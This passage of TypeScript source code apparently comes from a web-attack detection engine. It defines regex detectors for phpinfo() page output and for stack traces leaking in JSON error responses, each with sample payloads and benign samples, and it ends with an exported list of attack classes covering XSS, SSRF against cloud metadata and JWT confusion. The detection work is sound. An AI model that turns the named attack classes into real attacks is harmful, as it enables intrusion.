    cwe: 'CWE-200',
    knownPayloads: ['<title>phpinfo()</title>'],
    knownPayloads: ['<title>phpinfo()</title>', '<h1>PHP Version</h1>', '<title>phpinfo()</title><meta name="xss" content="1">'],
    knownBenign: ['<title>My App</title>', '<h1>Welcome</h1>', '<title>status</title>'],
    ...regexDetectionHandlers(PHPINFO_RE, 'L2 Hygiene analysis matched phpinfo() HTML output disclosure'),
    generateVariants: (count) => ['<title>phpinfo()</title>'].slice(0, count)
}

// 26. Memory JSON Stack Trace
const JSON_STACK_TRACE_RE = /"(?:trace|stack)"\s*:\s*\[[^\]]*["\n]/i
export const memoryJsonStackTrace: InvariantClassModule = {
    id: 'memory_json_stack_trace',
    description: 'Stack traces exposed in JSON error responses',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1592'],
    cwe: 'CWE-200',
    knownPayloads: ['{ "error": "Crash", "trace": [ "at Object.func (file.js:1:1)" ] }'],
    knownPayloads: ['{ "error": "Crash", "trace": [ "at Object.func (file.js:1:1)" ] }', '{ "error": "Crash", "stack": [ "at main (server.js:10:5)" ] }', '{ "message":"error","stack":[{"file":"app.js","line":12}] }'],
    knownBenign: ['{ "error": "Not Found" }', '{ "message": "ok", "status": 200 }', '{ "code": 400, "message": "bad request" }'],
    ...regexDetectionHandlers(JSON_STACK_TRACE_RE, 'L2 Hygiene analysis matched stack trace array in JSON payload'),
    generateVariants: (count) => ['{ "error": "Crash", "trace": [ "at Object.func (file.js:1:1)" ] }'].slice(0, count)
}

export const WEB_ATTACKS_CLASSES: InvariantClassModule[] = [
    xssMxssMutation,
    xssDomClobbering,
    xssSvgSmil,
    xssCssKeylogger,
    oauthAuthCodeInterception,
    oauthTokenEndpointCsrf,
    oauthRedirectUriTraversal,
    oauthDeviceCodePhishing,
    ssrfAwsImdsTtlBypass,
    ssrfGcpMetadata,
    ssrfAzureImds,
    ssrfDnsRebinding,
    http2RapidReset,
    http2HpackBomb,
    cryptoWeakCipher,
    cryptoBeastPoodle,
    jwtRs256Hs256Confusion,
    graphqlAliasBomb,
    graphqlFragmentBomb,
    supplyChainGithubActions,
    supplyChainPackageEval,
    memoryActuatorHeapdump,
    memoryPprofExposure,
    memoryPhpinfoOutput,
    memoryJsonStackTrace,
]
